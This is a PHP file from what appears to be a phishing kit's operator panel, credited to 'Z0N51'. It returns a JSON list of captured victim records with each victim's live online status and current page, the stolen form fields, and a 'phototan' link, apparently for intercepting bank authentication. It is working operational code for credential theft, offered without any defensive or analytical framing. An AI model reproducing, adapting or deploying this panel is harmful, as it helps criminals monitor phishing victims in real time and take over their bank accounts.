<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    include_once 'inc/app.php';

    if( !is_logged() ) {
        header("location: index.php");
        exit();
    }
    
    $data = get_data('data');

    $i = 0;
    if( $data ) {
        foreach($data as $result) {

            $visitor = get_data('visitors',['ip' => $result['ip']]);
            $visitor = $visitor[0];
            $period      = 12;
            $curtime     = time();
            $victim_time = $visitor['last_activity'] + $period;

            $visitor_status = visitor_status($result['ip']);
            if( $victim_time > time() ) {
                $visitor_status = '<span class="badge text-bg-success">Online => ('. $visitor['page'] .')</span>';
            } else {
                $visitor_status = '<span class="badge text-bg-danger">Offline => ('. $visitor['page'] .')</span>';
            }
            $data[$i]['online'] = $visitor_status;

            $res = json_decode($result['results'],true);
            $res_string = '';
            foreach($res as $key => $value) {

                if( $key == "phototan" ) {
                    $res_string .= "<span class='badge text-bg-info'>$key</span>: <b><a target='_blank' href='". $value ."'>LINK</a></b> ";
                } else {
                    $res_string .= "<span class='badge text-bg-info'>$key</span>: $value ";
                }

            }
            $data[$i]['results'] = $res_string;

            $i++;
        }
    }

    $result['data'] = $data;
    echo json_encode($result);
    die();
?>
